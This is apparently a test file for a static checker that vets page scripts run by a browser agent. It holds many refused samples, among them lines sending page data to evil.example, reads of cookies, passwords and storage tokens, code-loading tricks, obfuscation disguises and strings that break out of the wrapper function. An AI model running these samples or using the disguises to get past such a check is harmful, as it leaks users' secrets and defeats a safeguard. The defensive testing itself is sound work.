// The static check for scripts (src/content/scriptCheck.ts, docs/page-customisation.md › The static check): read-only
// analysis passes; every refused group is refused, including the usual disguises; the flags are raised; the code can
// never close the function it is wrapped in; size and line limits.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { checkScript, MAX_SCRIPT_BYTES, MAX_SCRIPT_LINES, tokenize, type ScriptFlag, type ScriptMode } from '../../src/content/scriptCheck.ts';

function ok(code: string, mode: ScriptMode = 'copy'): ScriptFlag[] {
  const result = checkScript(code, mode);
  assert.ok(result.ok, `should pass (${mode}): ${code}\n${result.ok ? '' : result.problems.join('\n')}`);
  assert.equal(result.code, code, 'the code is never rewritten');
  return result.flags;
}

function refused(code: string, mode: ScriptMode = 'page', why?: RegExp) {
  const result = checkScript(code, mode);
  assert.equal(result.ok, false, `should be refused (${mode}): ${code}`);
  if (why && !result.ok) assert.match(result.problems.join('\n'), why, code);
}

const ANALYSIS: string[] = [
  'return document.querySelectorAll("a").length;',
  'return document.links.length',
  'const rows = [...document.querySelectorAll("table tr")].map((tr) => [...tr.cells].map((c) => c.innerText.trim()));\nreturn rows;',
  'const counts = {};\nfor (const a of document.links) {\n  const h = new URL(a.href).hostname;\n  counts[h] = (counts[h] || 0) + 1;\n}\nreturn counts;',
  'const h = [...document.querySelectorAll("h1,h2,h3")].map((e) => ({ level: e.tagName, text: e.textContent.trim() }));\nreturn h.slice(0, 50);',
  "return Array.from(document.images).filter((i) => !i.alt).map((i) => i.src).slice(0, 20);",
  'const price = /\\d+[.,]\\d{2}/g;\nreturn (document.body.innerText.match(price) || []).length;',
  'if (document.title) /x/.test(document.title);\nreturn document.title;',
  'const words = document.body.innerText.split(/\\s+/).filter(Boolean);\nreturn { words: words.length, minutes: Math.ceil(words.length / 200) };',
  'const t = `${document.title} (${location.hostname})`;\nreturn t;',
  'const nested = `a ${ { x: `b ${1}` }.x } c`;\nreturn nested;',
  'class Counter { constructor() { this.n = 0; } add() { this.n++; } }\nconst c = new Counter(); c.add();\nreturn c.n;',
  'return getComputedStyle(document.body).fontSize;',
  'return window.innerWidth + "x" + window.innerHeight;',
  'return location.href;',
  'return pageUrl;',
  'await new Promise((r) => setTimeout(r, 10));\nreturn 1;',
  'return [...document.querySelectorAll("[data-price]")].reduce((s, e) => s + Number(e.dataset.price), 0);',
  'const rect = document.body.getBoundingClientRect();\nreturn rect.top;',
  'return { top: 1, parent: 2 };',
  "return 'a\\nb\\t\\u00e9\\u2014';",
  'let i = 0; while (i < 3) i++; return i / 2;',
  'const a = [1, 2, 3];\nreturn a[0] / a[1];',
  'return "x".replace(/x/, "y");',
  'return document.querySelector("details")?.open ?? null;',
];

test('read-only analysis scripts pass, in the copy and on the page, without flags', () => {
  for (const code of ANALYSIS) {
    assert.deepEqual(ok(code, 'copy'), [], code);
    assert.deepEqual(ok(code, 'page'), [], code);
  }
});

const REFUSED: [string, RegExp][] = [
  // Loading or making code.
  ['import("https://evil.example/x.js")', /import/],
  ['const m = await import("./x.js")', /import/],
  ['return import.meta.url', /import/],
  ['eval("1+1")', /eval/],
  ['(0, eval)("1")', /eval/],
  ['new Function("return 1")()', /Function/],
  ['(async () => {}).constructor("return 1")', /constructor/],
  ['[].constructor.constructor("alert(1)")()', /constructor/],
  ['const { constructor: F } = () => {}; F("x")', /constructor/],
  ['document.write("<p>x</p>")', /write/],
  ['document.body.appendChild(document.createElement("script"))', /<script>/],
  ['document.createElement("ifr" + "ame")', /tag that is not written out|pieces/],
  ['const tag = "script"; document.createElement(tag)', /tag that is not written out/],
  ['document.createElementNS("http://www.w3.org/1999/xhtml", "script")', /<script>/],
  ['el.innerHTML = "<script src=https://evil.example/x.js></script>"', /markup that loads code/],
  ['el.innerHTML = "<img src=x onerror=alert(1)>"', /inline event handlers/],
  ['a.href = "javascript:alert(1)"', /javascript: addresses/],
  ['frame.srcdoc = "<p>x</p>"', /srcdoc/],
  ['new Worker("w.js")', /workers/],
  ['URL.createObjectURL(new Blob(["x"]))', /createObjectURL/],
  ['WebAssembly.instantiate(bytes)', /WebAssembly/],
  ['setTimeout("alert(1)", 0)', /setTimeout with text/],
  ['setInterval(`x`, 10)', /setInterval with text/],
  ['importScripts("x.js")', /importScripts/],
  // Network channels other than the guarded fetch.
  ['new XMLHttpRequest()', /XMLHttpRequest/],
  ['navigator.sendBeacon("https://evil.example", data)', /sendBeacon/],
  ['new WebSocket("wss://evil.example")', /WebSocket/],
  ['new EventSource("/stream")', /EventSource/],
  ['new RTCPeerConnection({ iceServers: [{ urls: "stun:data.evil.example" }] })', /WebRTC/],
  ['window.fetch("/x")', /window\.fetch/],
  ['fetch("https://evil.example/?d=" + document.title)', /full address/],
  ['fetch(`//evil.example/${document.title}`)', /full address/],
  ['new Image().src = "https://evil.example/p?d=" + document.title', /full address/],
  ['img.setAttribute("src", "//evil.example/p")', /full address/],
  ['a.href = `https://evil.example/${location.pathname}`', /full address/],
  ['self.fetch("/x")', /window under another name/],
  ['globalThis.fetch("/x")', /globalThis/],
  ['const f = window; f.fetch("/x")', /used other than/],
  ['document.defaultView.fetch("/x")', /defaultView/],
  ['e.view.fetch("/x")', /\.view/],
  ['el.ownerDocument.defaultView.fetch("/x")', /defaultView/],
  // Cookies and secrets.
  ['return document.cookie', /cookies/],
  ['const { cookie } = document', /cookies|used other than/],
  ['return el.ownerDocument["cookie"]', /cookies/],
  ['return cookieStore.getAll()', /cookies/],
  ['return document.querySelector("input[type=password]").value', /password/],
  ['return document.querySelector("[autocomplete=one-time-code]").value', /one-time code/],
  ['return navigator.credentials.get({ password: true })', /saved passwords/],
  // Leaving the page or the frame.
  ['location.href = "https://evil.example/?" + document.title', /address/],
  ['location = "https://evil.example"', /address/],
  ['window.location = "https://evil.example"', /address|window\.location/],
  ['location.assign("https://evil.example")', /leaving the page/],
  ['location.replace("/x")', /leaving the page/],
  ['document.location.href = "/x"', /address/],
  ['open("https://evil.example")', /opening windows/],
  ['window.open("https://evil.example")', /window\.open/],
  ['history.back()', /leaving the page/],
  ['document.querySelector("iframe").contentWindow.fetch("/x")', /frames/],
  ['return top.document.title', /window under another name/],
  ['parent.postMessage("x", "*")', /window under another name|postMessage/],
  ['window.opener.location = "x"', /opener|window/],
  // Pressing and sending.
  ['document.querySelector("form").submit()', /submitting forms/],
  ['form.requestSubmit()', /submitting forms/],
  ['document.querySelector("button").click()', /pressing/],
  ['HTMLElement.prototype.click.call(btn)', /pressing/],
  ['const { click } = btn; click.call(btn)', /pressing/],
  ['btn.dispatchEvent(new MouseEvent("click"))', /made-up/],
  ['el.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter" }))', /made-up/],
  // Clipboard.
  ['await navigator.clipboard.readText()', /clipboard/],
  ['document.execCommand("copy")', /execCommand/],
  // Qutai's own objects.
  ['window.ReactNativeWebView.postMessage("{}")', /bridge|postMessage/],
  ['webkit.messageHandlers.x.postMessage(1)', /bridge/],
  ['return window.__qutaiAgent', /Qutai's own/],
  // What can't be checked.
  ['window["fe" + "tch"]("/x")', /pieces|used other than/],
  ['document[`coo${"kie"}`]', /pieces|used other than/],
  ['const k = "coo" + "kie"', /joined from pieces/],
  ['this["fetch"]("/x")', /this\[/],
  ['return Reflect.get(window, "fetch")', /Reflect|used other than/],
  ['new Proxy({}, {})', /Proxy/],
  ['return obj.__proto__', /__proto__/],
  ['return atob("ZmV0Y2g=")', /atob/],
  ['return String.fromCharCode(102, 101)', /fromCharCode/],
  ['return "\\x66etch"', /escape that spells "f"/],
  ['return "\\u0066etch"', /escape that spells "f"/],
  ['return "\\u{66}etch"', /escape that spells "f"/],
  ['return "\\146"', /octal/],
  ['with (document) { title }', /with/],
  ['debugger;', /debugger/],
  ['const self = 1', /window under another name/],
  // Site storage in one-off page scripts (tokens live there and the result goes to the model).
  ['return localStorage.getItem("token")', /storage/],
  ['return sessionStorage.length', /storage/],
  ['indexedDB.open("x")', /storage/],
];

test('every refused group is refused, plain and disguised', () => {
  for (const [code, why] of REFUSED) refused(code, 'page', why);
  // Refused in the copy too (the copy changes only what the flags allow).
  for (const [code] of REFUSED) refused(code, 'copy');
});

test('the code can never close its wrapper function: unbalanced brackets and every ambiguous spot are refused', () => {
  const breakouts = [
    '})(); fetch("https://evil.example"); (function(){',
    '}); evil(); (async function () {',
    '} evil(); {',
    'return 1 }',
    '((',
    'return [1, 2',
    '`unfinished ${1}',
    '"unfinished',
    "'line\nbreak'",
    '/* unfinished comment',
    // A "/" after "}" could be a regex or a division: the engine and the check might disagree.
    'a = {}\n/}/.test(x)',
    // HTML-like comments: the engine hides the rest of the line, a tokenizer would read a string there.
    "<!-- '\n})(); evil(); (function () { '",
    "x = 1; --> '\n})(); evil(); (function () { '",
    // Escaped names and invisible characters.
    'ev\\u0061l("1")',
    'return 1;‮//',
    'return "​"',
    // "/" after contextual words.
    'function f() { var await = 4; return await / 2 /\'x\'; }',
    'x++ / 2',
  ];
  for (const code of breakouts) refused(code, 'copy');
});

test('the tokenizer reads strings, templates, comments and regular expressions the way an engine does', () => {
  const kinds = (code: string) => tokenize(code).map((t) => `${t.type}:${t.value}`);
  assert.deepEqual(kinds('if (a) /}/.test(b)'), ['id:if', 'punct:(', 'id:a', 'punct:)', 'regex:/}/', 'punct:.', 'id:test', 'punct:(', 'id:b', 'punct:)']);
  assert.deepEqual(kinds('a = b / c / d'), ['id:a', 'punct:=', 'id:b', 'punct:/', 'id:c', 'punct:/', 'id:d']);
  assert.deepEqual(kinds('x = [/[/]/]'), ['id:x', 'punct:=', 'punct:[', 'regex:/[/]/', 'punct:]']);
  assert.deepEqual(kinds('`a${b}c`'), ['tmpl:a', 'id:b', 'tmpl:c']);
  assert.deepEqual(kinds('// } \n x'), ['id:x']);
  assert.deepEqual(kinds('"a\\"}"'), ['str:a"}']);
  // A line separator ends a // comment, as it does for the engine.
  assert.deepEqual(kinds('// c }'.replace('}', 'y')), ['id:y']);
});

test('flags: changing the page, loading addresses, the network, storage (kept scripts), fields', () => {
  assert.deepEqual(ok('document.body.style.color = "black";', 'page'), ['changesPage']);
  // A background can hold url(…): the page would load it.
  assert.deepEqual(ok('document.body.style.background = "black";', 'page'), ['changesPage', 'loads']);
  assert.deepEqual(ok('for (const tr of document.querySelectorAll("tr")) tr.hidden = !tr.innerText.includes("x");', 'page'), ['changesPage']);
  assert.deepEqual(ok('document.querySelector("h1").textContent = "Hi";', 'page'), ['changesPage']);
  assert.deepEqual(ok('document.body.classList.add("x");', 'page'), ['changesPage']);
  assert.deepEqual(ok('document.querySelectorAll(".ad").forEach((e) => e.remove());', 'page'), ['changesPage']);
  assert.deepEqual(ok('img.src = "/big/" + img.dataset.id;', 'page'), ['changesPage', 'loads']);
  assert.deepEqual(ok('new Image().src = "/x.png";', 'page'), ['changesPage', 'loads']);
  assert.deepEqual(ok('el.innerHTML = "<b>x</b>";', 'page'), ['changesPage', 'loads']);
  assert.deepEqual(ok('const r = await fetch("/api/items?page=2");\nreturn (await r.json()).length;', 'page'), ['network']);
  assert.deepEqual(ok('return document.querySelector("input[name=q]").value;', 'page'), ['fields']);
  assert.deepEqual(ok('localStorage.setItem("seen", "1");', 'kept'), ['storage']);
  // The copy shows no flags: nothing it does leaves the copy.
  assert.deepEqual(ok('document.body.style.background = "black"; return 1;', 'copy'), []);
});

test('mode rules: no network or storage in a copy, no storage in one-off page scripts', () => {
  refused('return (await fetch("/x")).status', 'copy', /no network/);
  refused('return localStorage.length', 'copy', /has none/);
  refused('return localStorage.length', 'page', /storage/);
  ok('return localStorage.length', 'kept');
  ok('return (await fetch("/x")).status', 'page');
});

test('size and line limits', () => {
  refused('', 'copy', /no code/);
  refused('   ', 'copy', /no code/);
  refused(`return ${JSON.stringify('x'.repeat(MAX_SCRIPT_BYTES))};`, 'copy', /at most 16 KB/);
  refused(Array.from({ length: MAX_SCRIPT_LINES + 1 }, () => 'x;').join('\n'), 'copy', /lines/);
  ok(`return ${JSON.stringify('x'.repeat(MAX_SCRIPT_BYTES - 20))};`, 'copy');
  assert.equal(checkScript(42, 'copy').ok, false);
});
